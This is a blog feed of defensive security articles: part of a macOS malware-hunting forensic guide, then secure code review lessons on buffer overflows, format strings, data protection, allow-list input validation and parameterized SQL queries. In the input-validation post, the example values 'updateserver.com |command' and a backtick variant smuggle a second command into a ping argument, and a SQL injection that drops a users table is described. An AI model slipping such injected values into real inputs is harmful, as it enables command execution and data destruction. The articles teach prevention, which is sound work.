directory in the last 30 minutes. You can substitute the m for h to specify
hours, or leave off a specifier and it will default to days.</p>

<p>$ find . -mtime +0m -a -mtime -30m -print</p>

<p>Depending on how much regular activity there has been on the device since
then, and how long the timespan you search for, that could result in an
overwhelming amount of data or just enough to be manageable, so adjust your
search parameters to suit.</p>

<p>We can also query the LSQuarantine database to see what items have been
downloaded by email clients and browsers.</p>

<table>
  <tbody>
    <tr>
      <td>$ sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* ‘select LSQuarantineEventIdentifier, LSQuarantineAgentName, LSQuarantineAgentBundleIdentifier, LSQuarantineDataURLString, LSQuarantineSenderName, LSQuarantineSenderAddress, LSQuarantineOriginURLString, LSQuarantineTypeNumber, date(LSQuarantineTimeStamp + 978307200, “unixepoch”) as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp’</td>
      <td>sort</td>
      <td>grep ‘</td>
      <td>’ –color</td>
    </tr>
  </tbody>
</table>

<p>Again, you could get a lot of data to sift through here, but filter on the
dates to find recent items. The good side of LSQuarantine is it will give you
the exact URL from where the file was downloaded, and you can use this to
check against reputation on VT or other sources. The downside of LSQuarantine
is that the database is easily purged by normal actions the user (or malicious
actor) can take in the UI, so <em>not</em>  finding something there doesn’t rule out
that a file didn’t actually come through the quarantine process.</p>

<p>Another useful trick here is to see what turns up just by doing an mdfind
query on the quarantine bit:</p>

<p>$ mdfind com.apple.quarantine</p>

<p>That should find documents – which are also tagged with the quarantine bit –
that have been downloaded, including <a href="https://www.sentinelone.com/blog/malicious-pdfs-revealing-techniques-
behind-attacks/">malicious
pdf,</a> Word .docx and others. Again, there’ll be a lot of innocent
stuff in the results, so careful filtering will be required.</p>

<p><strong>Step 7: Examine the Mac’s Network Configuration</strong></p>

<p>Malware authors on macOS have in some cases manipulated the DNS and AutoProxy
network configurations, so it’s always worth checking on these settings. You
can get all these from the command line, so first let’s get the details of the
network interface configuration with this command:</p>

<p>$ ifconfig</p>

<p>That will output information regarding the wireless, ethernet, bluetooth and
other interfaces. You’ll also want to gather the SystemConfiguration property
list to look out for malware that tries to hijack the Mac’s DNS server
settings, as <a href="https://www.sentinelone.com/blog/macos-malware-review-
in-2018/">OSX.MaMi</a> was seen to do in 2018.</p>

<p>$ plutil -p /Library/Preferences/SystemConfiguration/preferences.plist</p>

<p>Use this command</p>

<p>$ scutil –proxy</p>

<p>to inspect the Mac’s auto proxy settings. Spyware like
<a href="https://www.intego.com/mac-security-blog/intego-security-alert-
osxopinionspy-spyware-installed-by-freely-distributed-mac-
applications/?sr=1&amp;sr=1">OnionSpy</a> has been seen to configure these settings to redirect
user traffic to a server of the attacker’s choosing.</p>

<p><strong>Dive Into macOS’s Hidden Databases</strong></p>

<p>Depending on what access and authorization you have, it’s also possible to
dive a lot deeper and recover very fine-detailed information about file system
events, user’s browsing and email history, application usage, connected
devices and more. In a future post on macOS Digital Forensics and Incident
Response, we’ll cover things like Apple’s built-in system_profiler and
sysdiagnose utilities, unified logging, fsevents and a plethora of sqlite
caches that hold almost every detail you could ever wish to know. In the
majority of cases, the steps outlined above will be sufficient to find
evidence of even the most stealthy of macOS malware, but digging down into the
hidden depths of macOS may provide you with more evidence that can help in
detection, remediation, and attribution.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="MacOS"/>
    <category term="Threat Hunting"/>
    <category term="Malware Detection"/>
    <category term="EDR"/>
    <category term="Persistence Mechanisms"/>
    <category term="Open Ports"/>
    <category term="Processes"/>
    <category term="File System"/>
    <category term="Network Configuration"/>
    <category term="Forensics"/>
    <category term="Incident Response"/>
    <summary type="html"><![CDATA[How you go about hunting down malware on a macOS endpoint depends a great deal on what access you have to the device and]]></summary>
  </entry>
  <entry>
    <title type="html">Memory Safety Code Review</title>
    <link href="https://www.securesql.info/2018/11/30/overflowing/" rel="alternate" type="text/html" title="Memory Safety Code Review"/>
    <published>2018-11-30T00:00:00-08:00</published>
    <updated>2018-11-30T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2018/11/30/overflowing</id>
    <content type="html" xml:base="https://www.securesql.info/2018/11/30/overflowing/"><![CDATA[<p>Memory related vulnerabilities are very dangerous. Essential operating system
components and programs such as system services, browsers, crypto libraries
and document readers are written in C/C++ and are particularly exposed to
these types of flaws.</p>

<p>There are many flavours of memory vulnerabilities but we will focus on the
most common mistakes:</p>

<ol>
  <li>
    <p>Buffer Copy without Checking Size of Input — <a href="http://cwe.mitre.org/top25/index.html#CWE-120">CWE 120</a></p>
  </li>
  <li>
    <p>Incorrect Calculation of Buffer Size — <a href="http://cwe.mitre.org/top25/index.html#CWE-131">CWE 131</a></p>
  </li>
  <li>
    <p>Uncontrolled Format String — <a href="http://cwe.mitre.org/top25/index.html#CWE-134">CWE 134</a></p>
  </li>
  <li>
    <p>Off by One — <a href="https://cwe.mitre.org/data/definitions/193.html">CWE 193</a></p>
  </li>
</ol>

<p>How do we know they are the most common? All of these mistakes are documented
by MITRE with the top 3 being included in the <a href="http://cwe.mitre.org/top25/index.html">MITRE Sans Top
25</a>.</p>

<p>They all lead to arbitrary access of memory outside the intended boundaries.
This is also known as Overflow.</p>

<h1 id="memory-overflow-explained">Memory Overflow Explained</h1>

<p>Imagine the program uses two variables <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code>. The contents and length of
variable <code class="language-plaintext highlighter-rouge">b</code> are controlled by the user. The variable memory locations are
represented in the simplistic example below. Each variable is intended to
store 3 characters. At first variable <code class="language-plaintext highlighter-rouge">a</code> contains the string “<strong>Hi!”</strong>.</p>

<p><img src="https://securesql.info/images/1.png.avif" alt="" /></p>

<p>If the user enters the string <code class="language-plaintext highlighter-rouge">AAAAA</code> (5 As) for variable <code class="language-plaintext highlighter-rouge">b</code> the following
will happen.</p>

<p><img src="https://securesql.info/images/2.png.avif" alt="" /></p>

<p>Variable <code class="language-plaintext highlighter-rouge">b</code> only had 3 locations reserved for its value plus one for the
string terminator <code class="language-plaintext highlighter-rouge">\0</code> . By entering 5 characters the user is now writing into
space reserved for variable <code class="language-plaintext highlighter-rouge">a</code>.</p>

<p>Variables are pointers to memory locations. The value of <code class="language-plaintext highlighter-rouge">b</code> will now become
<em>AAAAA</em>** <em>i!</em>**  while the value of <code class="language-plaintext highlighter-rouge">a</code> will become <em>Ai!</em>. If the program
outputs the value of <code class="language-plaintext highlighter-rouge">b</code> then the attacker will be able to know part of the
value of <code class="language-plaintext highlighter-rouge">a</code> which is known as a <strong>memory leak</strong>.</p>

<p>If the user enters a sufficiently long value, they will hit the instruction
area and alter the program code.</p>

<p>Overflow can be prevented by controlling the number of characters read into
the buffer. This is done using memory safe functions. It is important to note
that simply using these functions will not prevent overflow. They also must be
used correctly.</p>

<p>There exists several functions that allow the program to limit the size of the
value read into a buffer: <code class="language-plaintext highlighter-rouge">fgets</code>, <code class="language-plaintext highlighter-rouge">snprintf</code>, <code class="language-plaintext highlighter-rouge">strncpy</code>, <code class="language-plaintext highlighter-rouge">strncmp</code>.</p>

<p>If the BUFF_SIZE argument is larger than the size of the buffer, overflow will
still occur.</p>

<p>In the example below we have two different code snippets that both read a
password from the standard input. Can you spot the one that allows Buffer
Overflow because it does not check the size of the input?</p>

<p><img src="https://securesql.info/images/3.png.avif" alt="" /></p>

<p>If you identified <code class="language-plaintext highlighter-rouge">bottom.cpp</code> as the vulnerable code you were correct. The
top example, is making use of <code class="language-plaintext highlighter-rouge">fgets</code> and it restricts the number of
characters to <strong>9</strong>.</p>

<h1 id="incorrect-calculation-of-buffer-size">Incorrect Calculation of Buffer Size</h1>

<p>Some of our keen readers may have noticed that if the size of <code class="language-plaintext highlighter-rouge">userPass</code> is
less than 9, then overflow will still occur.</p>

<p>This is an example of <strong>Incorrect Calculation of Buffer Size</strong>. Defining
constants for the size argument rather than using numerals and paying close
attention during code review to the code checking boundaries, can prevent this
type of flaw. Let’s take a look at the example below and see if we can spot
the vulnerable code.</p>

<p><img src="https://securesql.info/images/4.png.avif" alt="" /></p>

<p>If you identified <code class="language-plaintext highlighter-rouge">bottom.cpp</code> as the vulnerable code you were correct. The
top example, is making use of the constant <code class="language-plaintext highlighter-rouge">BUFFER_SIZE</code> to ensure
consistency. Besides being a safer option the code is also easier to maintain
if the constant value must be modified in the future. Many secure coding
practices have other benefits besides security.</p>

<h1 id="off-by-one">Off-by-one</h1>

<p>Off-by-one is another variation of buffer size flaw. This type of programming
mistake is introduced when employing comparison operators. A simple extra
equal sign, for example using<code class="language-plaintext highlighter-rouge">&lt;=</code> instead of<code class="language-plaintext highlighter-rouge">&lt;</code> can lead to the program
crashing. Let’s take a look at an example. Can you spot the vulnerable code?</p>

<p><img src="https://securesql.info/images/5.png.avif" alt="" /></p>

<p>If you spotted the error in <code class="language-plaintext highlighter-rouge">top.cpp</code> you are correct.</p>

<h1 id="memory-injection">Memory Injection?</h1>

<p>**Format String Injection  **is a type of vulnerability caused by
concatenating or using user input in a format parameter. Code that logs user
values using functions such as **printf  **is particularly exposed to this
type of vulnerability.</p>

<p>Take for example the snippets below. Can you spot which of the two snippets
allows the user to control the format string?</p>

<p><img src="https://securesql.info/images/6.png.avif" alt="" /></p>

<p>If you identified <code class="language-plaintext highlighter-rouge">top.cpp</code> as the code that allows <strong>Format String
Injection</strong>  you were correct. If the user includes <code class="language-plaintext highlighter-rouge">%d</code> or <code class="language-plaintext highlighter-rouge">%p</code> in the
password, <strong>printf</strong>  will take the next value following the format string and
include it in the display. This can lead to information disclosure or program
crashes.</p>

<p>By the way there are a couple of bonus insecure practices in both code
snippets :) . Did you spot them? One is the use of <code class="language-plaintext highlighter-rouge">printf</code>, a dangerous
function as mentioned earlier in the article. It’s also a bad practice to
display the user password.</p>

<h1 id="compiler-flags">Compiler Flags</h1>

<p>This is not really a code review item but is worth mentioning because is a
countermeasure that can be applied at build time to prevent the exploitation
of memory flaws.</p>

<p>Compiler flags enable operating system defences such as ASLR in Windows or
PIE/SSP in Linux. They tell the operating system to employ countermeasures
such as randomizing memory, which is making it hard for attackers to insert
arbitrary code.</p>

<p>Even with compiler flags in place attackers can still crash the program so the
main effect of compiler flags is reducing the impact of the attack. The best
defence is to prevent the flaws in the code, from the start, by employing the
best practices discussed in this article.</p>

<h1 id="to-sum-it-all-up">To sum it all up…</h1>

<ul>
  <li>
    <p><strong>Safer functions</strong> allow limiting the number of bytes read into the buffer</p>
  </li>
  <li>
    <p>Even with safe functions special attention should be paid to <strong>size specified</strong></p>
  </li>
  <li>
    <p><strong>Use constants</strong> to prevent mistakes</p>
  </li>
  <li>
    <p>Careful with the <strong>&lt; =</strong> operator</p>
  </li>
  <li>
    <p>Do not allow <strong>user input in format strings</strong></p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Memory Safety"/>
    <category term="Buffer Overflow"/>
    <category term="CWE 120"/>
    <category term="CWE 131"/>
    <category term="CWE 134"/>
    <category term="CWE 193"/>
    <category term="Input Validation"/>
    <category term="Format String Injection"/>
    <category term="Off-by-One"/>
    <category term="Compiler Flags"/>
    <category term="Secure Coding Practices"/>
    <summary type="html"><![CDATA[Some of our keen readers may have noticed that if the size of userPass is less than 9, then overflow will still occur.]]></summary>
  </entry>
  <entry>
    <title type="html">Data Controls Code Review</title>
    <link href="https://www.securesql.info/2018/09/08/pii-code-review/" rel="alternate" type="text/html" title="Data Controls Code Review"/>
    <published>2018-09-08T00:00:00-07:00</published>
    <updated>2018-09-08T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2018/09/08/pii-code-review</id>
    <content type="html" xml:base="https://www.securesql.info/2018/09/08/pii-code-review/"><![CDATA[<h1 id="cia-triad">CIA Triad</h1>

<p>Users entrust developers with their data. To earn and maintain their trust, we
must employ security controls that protect data from unauthorized access.
Confidentiality is one of three essential elements of <a href="https://en.wikipedia.org/wiki/Information_security">Information
Security</a>, also known as
the CIA triad (Confidentiality, Integrity and Availability).</p>

<p>Unfortunately the track record is not good. The number of user records exposed
in the United States has been in the billions in 2016 and 2017. 2018 will
likely be the same, once the final tally is calculated.</p>

<p>It is worth mentioning that not all of these breaches were caused by
programming flaws. Some were caused by negligence, many were caused by
phishing and malware attacks.</p>

<p>However at least one of the breaches of 2017 was caused by a <a href="https://arstechnica.com/information-technology/2017/09/massive-equifax-
breach-caused-by-failure-to-patch-two-month-old-bug/">programming
flaw</a>. The breach at the
credit rating company Equifax was responsible for almost 10% of the damage:
<a href="https://www.zdnet.com/article/how-the-equifax-breach-breaks-
down-by-the-numbers/">146 million</a> records. The attack leveraged a <a href="https://blog.shiftleft.io/discovering-code-vulnerabilities-using-
shiftleft-technology-2b5edc4175b9">OGNL
Injection</a> vulnerability in the Apache Struts library
and the subsequent failure to patch the affected systems. You can read about
Injection flaws in one of the <a href="https://medium.com/@paul_io/security-code-review-101-parameterized-
statements-df95c264364a">previous
articles</a> in this series.</p>

<h1 id="spotting-data-breaches-during-code-review">Spotting Data Breaches During Code Review</h1>

<p>Besides vulnerabilities in 3rd party components, there are programming flaws
that specifically involve storage and transmission of data and they may be
prevented during code review. They are as follows:</p>

<ul>
  <li>
    <p>Cleartext Storage of Sensitive Information — <a href="http://cwe.mitre.org/data/definitions/312.html">CWE 312</a></p>
  </li>
  <li>
    <p>Use of a One-Way Hash without a Salt — <a href="http://cwe.mitre.org/data/definitions/759.html">CWE 759</a></p>
  </li>
  <li>
    <p>Cleartext Transmission of Sensitive Information — <a href="http://cwe.mitre.org/data/definitions/319.html">CWE 319</a></p>
  </li>
  <li>
    <p>Use of a Broken or Risky Cryptographic Algorithm — <a href="http://cwe.mitre.org/data/definitions/327.html">CWE 327</a></p>
  </li>
</ul>

<p>We will review a few examples of these flaws and how they can be prevented
through software security best practices.</p>

<h1 id="uniquely-identifying-data-without-knowing-the-data">Uniquely Identifying Data Without Knowing the Data</h1>

<p>One of the strongest countermeasures that can be employed to prevent data
breaches is not storing the data at all.</p>

<p>But what if you still need to work with the data? For example, what if you
wanted to verify a user’s password without storing the actual password value?</p>

<p>You could transform the data in a non-reversible way. This can be done through
a cryptographic operation known as hashing.</p>

<p>Hashing algorithms, such as the <a href="https://en.wikipedia.org/wiki/SHA-2">SHA-2</a>
class of algorithms, convert data in a way that cannot be reversed. However
this doesn’t prevent one from trying a large amount of possible values in
order to reach the same outcome. This is known as
<a href="https://en.wikipedia.org/wiki/Password_cracking">cracking</a>. Cracking takes a
long time and requires a lot of computing resources. Hackers maintain lists of
pre-computed hashes, known as <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow
tables</a>, in order to avoid the
computing cost.</p>

<p>The defence employed against rainbow tables is to complicate the calculation
by adding a <em>salt</em>. A <em>salt</em>  is a random value that is added to the data
being transformed in order to alter the resulting hash.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ABCDEFG" + "-32524..." -&gt; sha256("ABCDEFG-32524...") -&gt; 97AF3... original     salt
</code></pre></div></div>

<p>Another defence against cracking is adaptive hashing. This involves re-hashing
the data for a large amount of iterations, each iteration taking longer than
the previous. This increases the computing time. For a single hash the time is
negligible but for a cracking attack it results in millions of years. A
largely adopted adaptive hashing algorithm is
<a href="https://en.wikipedia.org/wiki/PBKDF2">PBKDF2</a>.</p>

<p>Let’s take a look at the following code snippets. Can you spot the security
flaw?</p>

<p><img src="https://securesql.info/images/1.png.avif" alt="" /></p>

<p>If you identified the top example as being flawed you were correct. The top
example requires the user password stored as is. The bottom application is
storing the data hashed several times to increase computing time and is also
using a salt.</p>

<p>Secure hashing may be employed for various other types of data. For example if
an application needs to uniquely identify users for analytics purposes, it
could construct a unique, non-reversible hash from the user name and their IP
address. This process is known as
<a href="https://en.wikipedia.org/wiki/Tokenization_\(data_security\)">Tokenization</a>.</p>

<p>If the website analytics database is breached and the only thing obtained by
the attackers are these hashes, the data is useless to them or too costly to
reverse. However if the database contains user names and IPs and if the user
names are actual e-mails (a practice employed by many sites), then e-mails
will be sold on the dark web to be used for phishing and spam campaigns.</p>

<h1 id="securing-the-transmission-of-data">Securing the Transmission of Data</h1>

<p>Hashing can be an effective way to secure the data, but what if the attacker
is able to intercept the data before it is transformed? What if they can
intercept the data even before it reaches the application?</p>

<p>Up until 2018 major news outlets such as CNN or FOX NEWS were accessible over
unencrypted URLs. Those are site addresses that start with <code class="language-plaintext highlighter-rouge">http://</code> .</p>

<p>One of the things that may have prompted many sites to change this behaviour
was the addition of a <strong>Not Secure</strong>  message to the address bar of the
popular Google Chrome browser for all <code class="language-plaintext highlighter-rouge">http://</code> addresses.</p>

<p>When a website uses clear text to communicate with its users, <em>man-in-the-
middle</em>  attacks are possible. These attacks are can be online or offline
attacks. Offline attacks usually target the Confidentiality of the data, for
example tracking a user’s activity online or stealing their credentials.
Online attacks can also impact the Integrity of the data, like for example
replacing the content of a trusted news outlet with malware.</p>

<p>Communication security protocols, indicated by <code class="language-plaintext highlighter-rouge">http**s** ://</code> URLs, prevent
<em>man-in-the-middle</em>  attacks by encrypting the transmission and verifying the
identity of the two parties involved in the communication.</p>

<p>There are many details to transmission security that may be better covered in
a dedicated article, but we will focus primarily on one aspect that may come
up during a code review. This is using <code class="language-plaintext highlighter-rouge">http**s** ://</code> URLs.</p>

<p>Let’s take a look at a code example. Can you spot the code that transmits data
insecurely?</p>

<p><img src="https://securesql.info/images/2.png.avif" alt="" /></p>

<p>If you identified the bottom example as insecure you were correct. Notice that
the URL is prefixed with <code class="language-plaintext highlighter-rouge">http://</code> meaning that the data is transmitted in
clear text. Looking a bit to the right you can spot two pieces of sensitive
information being transmitted in the URL.</p>

<p>Note that is bad practice to store sensitive information in the URL even if
the url starts with <code class="language-plaintext highlighter-rouge">https://</code> . Thats’s because the URL may be inadvertently
bookmarked, sent to a 3rd party or stored in web server logs.</p>

<p>Sometimes developers change the code to ignore invalid certificates because
the test environment they are using does not have a valid web server
certificate. This is a bad practice because it practically violates the server
identity verification and allows _  man-in-the-middle _attackers to pretend
they are the target website. It is recommended to configure the development
environment to trust the test certificate instead of altering the program
behaviour.</p>

<h1 id="reversible-encryption">Reversible Encryption</h1>

<p>What if you must be able to work with the user data in clear text? For
example, you operate an online shopping or other financial site and must store
the user’s name, address and credit card information to process transactions.</p>

<p>First, I would like to emphasize that if this is the case, the site has a huge
target painted on it. It is likely subject to daily attacks. This is likely
the case for sites like Equifax or your banking site.</p>

<p>Unfortunately encryption would have not saved Equifax because the
vulnerability allowed attackers to run code on the web site. This let the
attackers make the web site do their bidding. Another thing that helped the
attackers is that the breach was not observed for a long period of time,
allowing them to exfiltrate information as users were interacting with the
website.</p>

<p>However let’s say the attackers don’t have this kind of access, but they have
access to the physical hard drive of the database server. A different common
attack vector could be a SQL Injection vulnerability that allows attackers to
alter the database queries in order to expose sensitive data.</p>

<p>In these cases encryption can be effective, provided that the attackers cannot
retrieve the encryption keys. If encryption keys are stored on a separate
server, also known as a Key Management Server or Service (KMS), then attackers
must obtain access to this server as well, which complicates the attack.
However if the encryption keys are stored in the same database, decrypting the
data is trivial. This scenario is similar to <em>hiding a key under the mat.</em></p>

<p>Let’s take a look at some code examples written in Node.js. Can you identify
the vulnerable snippet?</p>

<p><img src="https://securesql.info/images/3.png.avif" alt="" /></p>

<p>If you identified the top example you are correct. The top example is storing
the customer personal financial information in a AWS S3 bucket. S3 buckets
have notoriously been exposed to data breaches in the past years. While S3
offers data encryption capabilities, this configuration may not be enabled and
it does not protect from all types of attacks.</p>

<h1 id="to-sum-it-all-up">To sum it all up</h1>

<p>Some key takeaways from this article:</p>

<ul>
  <li>
    <p>Where possible employ secure hashing to transform the data in a way that cannot be reversed</p>
  </li>
  <li>
    <p>Enforce secure communication between clients and servers</p>
  </li>
  <li>
    <p>Encrypt sensitive data in databases to prevent physical data theft and mitigate SQL Injection</p>
  </li>
  <li>
    <p>Store encryption keys in a KMS</p>
  </li>
  <li>
    <p>Vulnerabilities that allow code execution on the server may still expose the data in spite of encryption, so all secure coding practices are data protection practices.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="CIA Triad"/>
    <category term="Confidentiality"/>
    <category term="Data Protection"/>
    <category term="Data Security"/>
    <category term="Cryptography"/>
    <category term="Secure Coding"/>
    <category term="Code Review"/>
    <category term="Injection Flaws"/>
    <category term="Encryption"/>
    <category term="Hashing"/>
    <category term="Tokenization"/>
    <summary type="html"><![CDATA[The number of user records exposed in the United States has been in the billions in 2016 and 2017. 2018 will likely be the same, once the final tally is calculated.]]></summary>
  </entry>
  <entry>
    <title type="html">Solving 90% of application security defects with a proven technique</title>
    <link href="https://www.securesql.info/2018/09/08/secure-code-review-for-l33t-hax0rs/" rel="alternate" type="text/html" title="Solving 90% of application security defects with a proven technique"/>
    <published>2018-09-08T00:00:00-07:00</published>
    <updated>2018-09-08T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2018/09/08/secure-code-review-for-l33t-hax0rs</id>
    <content type="html" xml:base="https://www.securesql.info/2018/09/08/secure-code-review-for-l33t-hax0rs/"><![CDATA[<blockquote>
  <p><em>Would you let someone in your house if you thought they should not be
there?</em></p>
</blockquote>

<p>You wouldn’t. So why allow any input to your application? Why allow symbols
into a variable that is intended to be numeric?</p>

<p>Even when validation is used, a common mistake is to use <strong>block lists</strong>. For
example an application will prevent symbols that are known to cause trouble.
The weakness of this countermeasure is that some symbols may be overlooked.</p>

<blockquote>
  <p><em>Would you maintain a block list of people that cannot come to your house?</em></p>
</blockquote>

<p>You wouldn’t. So why block quotes when you know the input should be numeric?
You should only allow numbers.</p>

<p>In the two code samples below one has a security issue due to improper input
validation. Can you tell which?</p>

<p><img src="https://securesql.info/images/1.png.avif" alt="" /></p>

<p>Both code samples, <em>shell out</em> , to execute OS commands, in this case sending
a ping to a server. <em>Shelling out</em>  is an insecure practice because it can
lead to OS Command Injection, however the bottom code mitigates the issue
because it uses an <em>allow list</em>  to prevent hazardous characters while the top
code uses a <em>block list</em>  which is, in this case, insufficient since an
attacker could pass in something like _updateserver.com  _<strong><em><code class="language-plaintext highlighter-rouge">command</code></em></strong>  or
_updateserver.com  _<strong>_|command  _</strong>and neither <strong>`</strong>  nor <strong>|</strong>  have been
included in the block list.</p>

<p>As you can see, allow lists are much more effective at preventing application
security issues. A simple multi-purpose function that checks if the input is
alphanumeric can prevent multiple types of flaws:</p>

<p>public class InputValidation</p>

<p>{</p>

<p>/**</p>

<p>Sample java input validation function that validates that the input is
alphanumeric or part of a list of allowed exceptions</p>

<p>*/</p>

<p>public static boolean isAlphanumOrExcepted(int maxSize, String val, char …
excepted){</p>

<p>boolean result = true;</p>

<p>int count = val.length();</p>

<p>if(count&gt;maxSize) return false;</p>

<p>for(int i=0;i&lt;count;i++){</p>

<p>char c = val.charAt(i);</p>

<p>boolean isOk = false;</p>

<p>//if alphabetic turns true , this works for Unicode chars</p>

<table>
  <tbody>
    <tr>
      <td>isOk = isOk</td>
      <td>Character.isAlphabetic(c);</td>
    </tr>
  </tbody>
</table>

<p>//if it’s a digit turns true, this works for Unicode chars</p>

<table>
  <tbody>
    <tr>
      <td>isOk = isOk</td>
      <td>Character.isDigit(c);</td>
    </tr>
  </tbody>
</table>

<p>//if it’s in the list of exceptions turns true</p>

<p>for(char ex : excepted){</p>

<table>
  <tbody>
    <tr>
      <td>isOk = isOk</td>
      <td>ex==c;</td>
    </tr>
  </tbody>
</table>

<p>}</p>

<p>if(isOk == false){ //if one of the characters didn’t meet the requirements
return false</p>

<p>return false;</p>

<p>}</p>

<p>}</p>

<p>return result;</p>

<p>}</p>

<p>}</p>

<p>And here is how to use this simple function to prevent a wide range of
attacks:</p>

<p>protected void doGet(HttpServletRequest request, HttpServletResponse response)
throws ServletException, IOException {</p>

<p>String input = request.getParameter(“input”);</p>

<p>if(InputValidation.isAlphanumericOrExcepted(EXPECTED_SIZE,input,’.’,’-‘,’_’)){</p>

<p>//process the input</p>

<p>}</p>

<p>else{</p>

<p>//return 400 Invalid Input and log attack attempt</p>

<p>}</p>

<p>}</p>

<p>One little function can prevent multiple attack types. The table below
demonstrates how the function prevents SQL Injection, OS Injection, Cross-Site
Scripting and Path Traversal.</p>

<p><img src="https://securesql.info/images/2.png.avif" alt="" /></p>

<p>The function also works for multi-language support. For example the character
<strong><em>è</em></strong>  will be considered a letter and will be allowed.</p>

<p>In an HTTP request there are many parameters that are simply numeric or
alphanumeric. Let’s analyze the URL below which is part of a Twitter API
request generated by executing a search for <code class="language-plaintext highlighter-rouge">security</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[https://api.twitter.com/2/search/adaptive.json?include_profile_interstitial_type=1&amp;include_blocking=1&amp;include_blocked_by=1&amp;include_followed_by=1&amp;include_want_retweets=1&amp;include_mute_edge=1&amp;include_can_dm=1&amp;include_can_media_tag=1&amp;skip_status=1&amp;cards_platform=Web-12&amp;include_cards=1&amp;include_composer_source=true&amp;include_ext_alt_text=true&amp;include_reply_count=1&amp;tweet_mode=extended&amp;include_entities=true&amp;include_user_entities=true&amp;include_ext_media_color=true&amp;send_error_codes=true&amp;q=security&amp;count=20&amp;query_source=typd&amp;pc=1&amp;spelling_corrections=1&amp;ext=mediaStats%2ChighlightedLabel](https://api.twitter.com/2/search/adaptive.json?include_profile_interstitial_type=1&amp;include_blocking=1&amp;include_blocked_by=1&amp;include_followed_by=1&amp;include_want_retweets=1&amp;include_mute_edge=1&amp;include_can_dm=1&amp;include_can_media_tag=1&amp;skip_status=1&amp;cards_platform=Web-12&amp;include_cards=1&amp;include_composer_source=true&amp;include_ext_alt_text=true&amp;include_reply_count=1&amp;tweet_mode=extended&amp;include_entities=true&amp;include_user_entities=true&amp;include_ext_media_color=true&amp;send_error_codes=true&amp;q=security&amp;count=20&amp;query_source=typd&amp;pc=1&amp;spelling_corrections=1&amp;ext=mediaStats%2ChighlightedLabel)
</code></pre></div></div>

<p>The only parameter here that may need to be excluded from validation is <code class="language-plaintext highlighter-rouge">q</code> .
More than 90% of the request parameters can benefit from an alphanumeric allow
list. By applying input validation to 90% of the input on the request, we
reduce 90% of the attack surface. This is why input validation is the most
effective way of reducing vulnerabilities.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Application Security"/>
    <category term="Input Validation"/>
    <category term="OS Command Injection"/>
    <category term="Allow List"/>
    <category term="Block List"/>
    <category term="SQL Injection"/>
    <category term="Cross-Site Scripting"/>
    <category term="Path Traversal"/>
    <category term="Security Best Practices"/>
    <summary type="html"><![CDATA[Even when validation is used, a common mistake is to use block lists. For example an application will prevent symbols that are known to cause trouble. The weakness of this countermeasure is that some symbols may be overlooked.]]></summary>
  </entry>
  <entry>
    <title type="html">Binding Parameters</title>
    <link href="https://www.securesql.info/2018/09/07/binding-params/" rel="alternate" type="text/html" title="Binding Parameters"/>
    <published>2018-09-07T00:00:00-07:00</published>
    <updated>2018-09-07T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2018/09/07/binding-params</id>
    <content type="html" xml:base="https://www.securesql.info/2018/09/07/binding-params/"><![CDATA[<p>In the previous article we reviewed <strong>Input Validation</strong>. While <strong>Input
Validation</strong> is an effective deterrent to a large number of attacks, including
<strong>Injection</strong> , not all input can be filtered.</p>

<p>For example imagine someone’s name is <strong>O’Brien</strong>. The single quote in**
O’Brien**happens to also be part of SQL command syntax. For example a website
may perform a database record search like this:</p>

<p><img src="https://securesql.info/images/simple.png.avif" alt="" /></p>

<p>Notice that the single quote in the name O’Brien is causing a syntax error.
The SQL command processor considers the string ends with <strong>O</strong>  and the rest,
<strong>BRIEN%,</strong>  is just an unrecognized command.</p>

<p>In order to work around this problem one must escape the single quote with a
another single quote like in the image below.</p>

<p><img src="https://securesql.info/images/simple2.png.avif" alt="" /></p>

<p>However when this query is executed by a program, things look different. The
name would be read from a variable and the database query would be constructed
dynamically.</p>

<p>Let’s take a look at the following code snippet.</p>

<p><img src="https://securesql.info/images/simple3.png.avif" alt="" /></p>

<p>The variable **lastName  **contains input coming from the user. It is
concatenated to a constant SQL query string and the resulting command is
passed to the database server.</p>

<p>There is no input validation and no input escaping whatsoever. This means that
a user entering <strong>O’Brien</strong>  would cause an SQL syntax error, which is a bug.
However a malicious user would take advantage of this behaviour. What would
happen if the user entered something like the string below?</p>

<p><img src="https://securesql.info/images/simple4.png.avif" alt="" /></p>

<p>The SQL query being passed to the database would end up being two different
commands. One selects all users in the database, while the other deletes the
users table.</p>

<p><img src="https://securesql.info/images/simple5.png.avif" alt="" /></p>

<p>If these concepts are new to you, now you can finally enjoy this old hacker
joke about little Bobby Tables.</p>

<p><img src="https://securesql.info/images/simple6.png.avif" alt="" /></p>

<p>Preventing Injection</p>

<p>As the old comic suggests, sanitizing the user input could have prevented the
issue. “Sanitizing” could have been done with Input Validation or escaping of
the single quote. However not all input can be validated and not all SQL
Injection is done with single quotes.</p>

<p>In the example below Injection takes advantage of an un-sanitized <strong>ORDER BY</strong>
parameter:</p>

<p><img src="https://securesql.info/images/simple7.png.avif" alt="" /></p>

<p>In this case <strong>Input Validation</strong>  could be employed because column names
should be alphanumeric however this leads to a more complex defence strategy
where the application must employ <strong>Input Validation</strong>  for values going into
the <strong>ORDER BY  **section and **Escaping</strong>  for values going into the
<strong>WHERE</strong> clause.</p>

<p>There is however a simpler way. <strong>Do not use concatenation at all</strong>. This
approach also holds true for other Injection scenarios like Command Injection.</p>

<p><img src="https://securesql.info/images/simple8.png.avif" alt="" /></p>

<p>This is a scenario where we can employ <a href="https://simple.wikipedia.org/wiki/Occam%27s_razor">Occam’s
Razor</a> to identify the
simplest most universal defence to Injection attacks. The solution here is
using <strong>Parameterized Statements.</strong></p>

